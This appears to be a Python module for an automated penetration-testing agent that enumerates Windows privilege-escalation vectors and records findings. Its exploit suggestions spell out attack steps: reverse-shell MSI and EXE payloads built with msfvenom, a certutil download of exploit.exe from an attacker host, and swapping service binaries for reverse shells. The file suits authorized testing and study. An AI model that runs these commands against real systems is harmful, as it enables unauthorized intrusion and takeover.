"""
windows_enum_subagent.py — Windows privilege escalation enumeration.

AGENT_NAME  : "privesc"
SUBAGENT_NAME: "windows_enum"

Methodology (OSCP/HackTricks style):
  1. Run winpeas.exe / winpeasx64.exe for comprehensive automated enumeration
  2. Run PowerUp.ps1 (Invoke-AllChecks) for PowerShell-based checks
  3. Run Seatbelt.exe for system-state enumeration
  4. Manual checks via PowerShell/cmd: whoami /priv, systeminfo, sc qc, reg query
  5. Check: AlwaysInstallElevated, unquoted service paths, weak service perms,
            modifiable binaries, token privileges, scheduled tasks
  6. Parse and store findings with appropriate severity
"""

from __future__ import annotations

import logging
import re
from typing import Any

from agents.base_subagent import BaseSubagent, Finding, SubagentResult

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Detection patterns
# ---------------------------------------------------------------------------

_ALWAYS_INSTALL_RE = re.compile(r"AlwaysInstallElevated\s*[:\=]\s*(1|0x1|YES|True)", re.IGNORECASE)
_UNQUOTED_SVC_RE = re.compile(r"Unquoted\s+Service\s+Path|BINARY_PATH_NAME.*[^\"]\s+[^\"\\]", re.IGNORECASE)
_WEAK_SVC_RE = re.compile(r"(Modifiable|Write|FullControl)\s*(service|binary|path)", re.IGNORECASE)
_AUTORUN_RE = re.compile(r"(autorun|startup.*modifiable|ModifiableAutoRun)", re.IGNORECASE)
_TOKEN_PRIV_RE = re.compile(
    r"(SeImpersonatePrivilege|SeAssignPrimaryTokenPrivilege|SeTcbPrivilege|"
    r"SeBackupPrivilege|SeRestorePrivilege|SeCreateTokenPrivilege|"
    r"SeLoadDriverPrivilege|SeTakeOwnershipPrivilege|SeDebugPrivilege)",
    re.IGNORECASE,
)
_UAC_RE = re.compile(r"(EnableLUA|ConsentPromptBehaviorAdmin|UAC.*disabled|UAC.*bypass)", re.IGNORECASE)
_CRED_RE = re.compile(r"(password|credential|secret)\s*[=:]\s*\S+", re.IGNORECASE)
_KERNEL_CVE_RE = re.compile(r"(MS\d{2}-\d+|CVE-\d{4}-\d+)", re.IGNORECASE)
_SCHED_TASK_RE = re.compile(r"(TaskName|Task Name)\s*:\s*(\S.*)", re.IGNORECASE)


class WindowsEnumSubagent(BaseSubagent):
    """Enumerate Windows privilege escalation vectors."""

    AGENT_NAME: str = "privesc"
    SUBAGENT_NAME: str = "windows_enum"

    async def run(self, target: str, session_type: str = "cmd", **kwargs: Any) -> SubagentResult:
        """
        Enumerate Windows privilege escalation opportunities.

        Parameters
        ----------
        target:
            Target Windows host (IP or hostname).
        session_type:
            Shell type in use: ``"cmd"`` or ``"powershell"``.

        Returns
        -------
        SubagentResult
        """
        result = SubagentResult(
            session_id=self.session_id,
            subagent_name=self.SUBAGENT_NAME,
            target=target,
        )

        # ── 1. whoami /priv — token privileges ────────────────────────────
        whoami_output = await self.collect_tool(
            "cmd",
            target,
            {"options": "/c whoami /priv /groups 2>&1"},
        )

        dangerous_privs = _TOKEN_PRIV_RE.findall(whoami_output)
        if dangerous_privs:
            unique_privs = list(set(dangerous_privs))
            priv_advice = {
                "SeImpersonatePrivilege": "Run JuicyPotato/PrintSpoofer/RoguePotato for SYSTEM shell",
                "SeAssignPrimaryTokenPrivilege": "Run JuicyPotato for SYSTEM escalation",
                "SeBackupPrivilege": "Read any file including SAM/SYSTEM hive",
                "SeRestorePrivilege": "Write to any file — replace privileged binaries",
                "SeLoadDriverPrivilege": "Load malicious kernel driver for SYSTEM",
                "SeDebugPrivilege": "Inject into SYSTEM processes via OpenProcess",
                "SeTcbPrivilege": "Act as part of the OS — create any token",
            }
            advice = "; ".join(priv_advice.get(p, p) for p in unique_privs[:3])

            await self.store_finding(Finding(
                title=f"Windows Privesc: Dangerous Token Privileges — {', '.join(unique_privs[:3])}",
                description=(
                    f"Current user has dangerous token privileges enabled: {', '.join(unique_privs)}. "
                    f"These privileges can be abused to escalate to NT AUTHORITY\\SYSTEM."
                ),
                severity="HIGH",
                evidence=whoami_output[:1000],
                tool="cmd",
                host=target,
                mitre_technique="T1134.001",
                exploit_suggestion=advice,
            ))

        # ── 2. systeminfo — OS version, hotfix history ────────────────────
        sysinfo_output = await self.collect_tool(
            "cmd",
            target,
            {"options": "/c systeminfo 2>&1"},
        )

        # Run windows-exploit-suggester equivalent
        wes_output = await self.collect_tool(
            "windows-exploit-suggester",
            target,
            {"options": f"--systeminfo /tmp/sysinfo_{target.replace('.', '_')}.txt --database /usr/share/wesng/wes.csv 2>&1"},
        )

        kernel_cves = list(set(_KERNEL_CVE_RE.findall(wes_output + sysinfo_output)))
        if kernel_cves:
            await self.store_finding(Finding(
                title=f"Windows Privesc: {len(kernel_cves)} Kernel/OS Exploit(s) Suggested",
                description=(
                    f"Windows Exploit Suggester identified potential kernel vulnerabilities: "
                    f"{', '.join(kernel_cves[:10])}. "
                    f"These unpatched CVEs may allow local privilege escalation to SYSTEM."
                ),
                severity="HIGH",
                evidence=(wes_output or sysinfo_output)[:2000],
                tool="windows-exploit-suggester",
                host=target,
                mitre_technique="T1068",
                exploit_suggestion=(
                    "Search Exploit-DB: searchsploit <CVE-ID>. "
                    "Download pre-compiled exploits from github.com/SecWiki/windows-kernel-exploits. "
                    "Transfer via SMB/HTTP: certutil -urlcache -split -f http://LHOST/exploit.exe exploit.exe"
                ),
            ))

        # ── 3. AlwaysInstallElevated check ────────────────────────────────
        aie_output = await self.collect_tool(
            "cmd",
            target,
            {"options": (
                "/c reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>&1 && "
                "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>&1"
            )},
        )

        if _ALWAYS_INSTALL_RE.search(aie_output):
            await self.store_finding(Finding(
                title="Windows Privesc: AlwaysInstallElevated Enabled — MSI SYSTEM Shell",
                description=(
                    "AlwaysInstallElevated registry key is set to 1 in both HKLM and HKCU. "
                    "Any MSI installer will run as NT AUTHORITY\\SYSTEM regardless of the "
                    "current user's privileges, allowing trivial privilege escalation."
                ),
                severity="HIGH",
                evidence=aie_output[:500],
                tool="cmd",
                host=target,
                mitre_technique="T1548.002",
                exploit_suggestion=(
                    "Generate MSI payload: msfvenom -p windows/shell_reverse_tcp "
                    "LHOST=LHOST LPORT=LPORT -f msi -o /tmp/priv.msi. "
                    "Transfer and run: msiexec /quiet /qn /i priv.msi"
                ),
            ))

        # ── 4. Unquoted service paths ─────────────────────────────────────
        unquoted_output = await self.collect_tool(
            "cmd",
            target,
            {"options": (
                "/c wmic service get name,displayname,pathname,startmode 2>&1 | "
                "findstr /i auto | findstr /i /v \"\\\"\" | findstr /i /v \"C:\\Windows\\\\\""
            )},
        )

        unquoted_hits = [l for l in unquoted_output.splitlines() if l.strip() and " " in l]
        if unquoted_hits:
            await self.store_finding(Finding(
                title=f"Windows Privesc: {len(unquoted_hits)} Unquoted Service Path(s)",
                description=(
                    f"{len(unquoted_hits)} service(s) have unquoted binary paths containing spaces. "
                    "If a writable directory exists earlier in the path, placing a malicious binary "
                    "there will execute as the service's account (often SYSTEM or NetworkService) "
                    "upon next service restart."
                ),
                severity="HIGH",
                evidence=unquoted_output[:1000],
                tool="cmd",
                host=target,
                mitre_technique="T1574.009",
                exploit_suggestion=(
                    "Identify first writable directory in service path. "
                    "Place reverse shell binary at that path. "
                    "Restart service: sc stop <svc> && sc start <svc> (or wait for reboot)."
                ),
            ))

        # ── 5. Weak service permissions (icacls) ──────────────────────────
        svc_perm_output = await self.collect_tool(
            "powershell",
            target,
            {"options": (
                "-Command \"Get-WmiObject Win32_Service | "
                "ForEach-Object { "
                "$path = $_.PathName -replace '\"',''; "
                "if ($path -and (Test-Path $path)) { "
                "$acl = icacls $path 2>&1; "
                "if ($acl -match 'Everyone|BUILTIN\\\\Users|Authenticated Users.*M|F') { "
                "Write-Output ('{0}: {1}' -f $_.Name, $path) }}} 2>&1\""
            )},
        )

        weak_svcs = [l for l in svc_perm_output.splitlines() if l.strip()]
        if weak_svcs:
            await self.store_finding(Finding(
                title=f"Windows Privesc: {len(weak_svcs)} Service(s) with Weak Binary Permissions",
                description=(
                    f"{len(weak_svcs)} service binary/ies are writable by low-privilege users. "
                    "Replacing the binary with a reverse shell will execute as the service "
                    "account (often SYSTEM) upon next service restart."
                ),
                severity="HIGH",
                evidence=svc_perm_output[:1000],
                tool="powershell",
                host=target,
                mitre_technique="T1574.010",
                exploit_suggestion=(
                    "Copy original binary, place malicious binary at same path, "
                    "restart service: sc stop <svc> && sc start <svc>. "
                    "Payload: msfvenom -p windows/shell_reverse_tcp -f exe -o svc.exe"
                ),
            ))

        # ── 6. Scheduled task enumeration ────────────────────────────────
        schtask_output = await self.collect_tool(
            "cmd",
            target,
            {"options": "/c schtasks /query /fo LIST /v 2>&1"},
        )

        task_names = _SCHED_TASK_RE.findall(schtask_output)
        non_system_tasks = [t for _, t in task_names
                            if not re.search(r"(Microsoft|Windows|OneDrive)", t, re.IGNORECASE)]
        if non_system_tasks:
            await self.store_finding(Finding(
                title=f"Windows Privesc: {len(non_system_tasks)} Non-Microsoft Scheduled Task(s)",
                description=(
                    f"{len(non_system_tasks)} third-party scheduled tasks found. "
                    "Tasks running as SYSTEM with modifiable scripts or binaries "
                    "can be hijacked for privilege escalation. "
                    f"Tasks: {', '.join(non_system_tasks[:5])}."
                ),
                severity="MEDIUM",
                evidence=schtask_output[:1500],
                tool="cmd",
                host=target,
                mitre_technique="T1053.005",
                exploit_suggestion=(
                    "Check task 'Run As' user and script path. "
                    "If script is writable: replace with reverse shell payload. "
                    "Run: icacls <task_script_path>"
                ),
            ))

        # ── 7. UAC level check ────────────────────────────────────────────
        uac_output = await self.collect_tool(
            "cmd",
            target,
            {"options": (
                "/c reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System "
                "/v ConsentPromptBehaviorAdmin /v EnableLUA /v PromptOnSecureDesktop 2>&1"
            )},
        )

        uac_disabled = "0x0" in uac_output.lower() or "EnableLUA    REG_DWORD    0x0" in uac_output
        if uac_disabled:
            await self.store_finding(Finding(
                title="Windows Privesc: UAC Disabled — No Elevation Prompt",
                description=(
                    "User Account Control (UAC) is disabled on the target system. "
                    "Any process can escalate to administrator level without a prompt, "
                    "significantly reducing the attack surface protection."
                ),
                severity="HIGH",
                evidence=uac_output[:500],
                tool="cmd",
                host=target,
                mitre_technique="T1548.002",
                exploit_suggestion=(
                    "UAC bypass not required — spawn admin shell directly. "
                    "Run any admin command without elevation prompt."
                ),
            ))

        result.findings = list(self._findings)
        result.tool_outputs = dict(self._tool_outputs)
        return result
